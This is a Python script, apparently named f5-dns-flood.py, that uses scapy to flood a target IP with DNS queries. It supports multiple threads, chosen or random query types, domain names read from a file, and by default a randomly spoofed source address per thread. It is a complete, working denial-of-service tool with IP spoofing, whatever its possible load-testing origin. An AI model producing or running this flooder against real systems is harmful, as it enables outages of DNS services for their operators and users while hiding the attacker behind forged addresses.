#! /usr/bin/env python

import threading
import socket
import sys
import getopt
import random
import struct
from scapy.all import *
from threading import Thread

srcIP = '1.1.1.1'
DNSQuery = ''
fileName = ''
loopCount = 500
threadCount = 1
randomSrc = False
qTypes = ['A', 'MX', 'PTR', 'TXT', 'AAAA', 'NS', 'CNAME', 'SOA', 'ANY', 'SRV', 'A', 'A', 'A', 'A', 'A']
QueryType = random.choice(qTypes)


def random_line(afile):
	line = next(afile)
	for num, aline in enumerate(afile):
		if random.randrange(num + 2): continue
		line = aline
	return line

commandArgs = '\nf5-dns-flood.py -d <dest IP> [-s <src IP>] [-q A|TXT|MX|NS|CNAME|SOA|ANY|SRV|AAAA]] [-n <domain name>] [-t <# threads] [-f <domain name source file>] [-l loopcount]\n'

if (len(sys.argv) < 2):
	print commandArgs
	sys.exit(1)
try:
	options, prog = getopt.getopt(sys.argv[1:], "hd:s:q:n:t:f:l:")
except getopt.GetoptError:
	print commandArgs

for opt, arg in options:
	if opt == '-h':
		print commandArgs
		print
		print 'Enter at least a destination VIP address.  All other parameters will be defaulted.'
		print '-s specify a source address to be used'
		print '-q specify a query type to use'
		print '-n provide a domain name to query'
		print '-t indicate the number of threads to run using random source addresses'
		print '-f a file name containing DNS domain names'
		print '   where file contains lines like this: thumbs2.ebaystatic.com.\tAAAA'
		sys.exit(2)
	elif (opt == '-d'):
		dstIP = arg
	elif (opt == '-s'):
		srcIP = arg
	elif (opt == '-q'):
		QueryType = arg
	elif (opt == '-n'):
		DNSQuery = arg
	elif (opt == '-t'):
		threadCount = int(arg)
	elif (opt == '-f'):
		fileName = arg
	elif (opt == '-l'):
		loopCount = int(arg)

if srcIP == '1.1.1.1':
	randomSrc = True
if DNSQuery == '':
	DNSQuery = 'aaa.com'
	if fileName:
		f = open(fileName)
		DNSQuery = random_line(f).split(".\t")[0]
		f.close()
#send(IP(dst="10.59.141.30", src="1.2.3.4")/UDP(sport=RandShort())/DNS(rd=1,opcode=0,qd=DNSQR(qname="aaa.com",qclass="IN",qtype="A")),loop=1)

def newSrcAttack(dstIP, srcIP, DNSQuery, QueryType, loopCount):
	send(IP(dst=dstIP, src=srcIP)/UDP(sport=RandShort())/DNS(rd=1,opcode=0,qd=DNSQR(qname=DNSQuery,qclass="IN",qtype=QueryType)), count=loopCount)

for i in range(threadCount):
	if randomSrc:
		srcIP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
	print
	print 'Send from', srcIP, 'to', dstIP, 'and query for', QueryType, 'at', DNSQuery
	t = Thread(target=newSrcAttack, args=(dstIP, srcIP, DNSQuery, QueryType, loopCount))
	t.start();
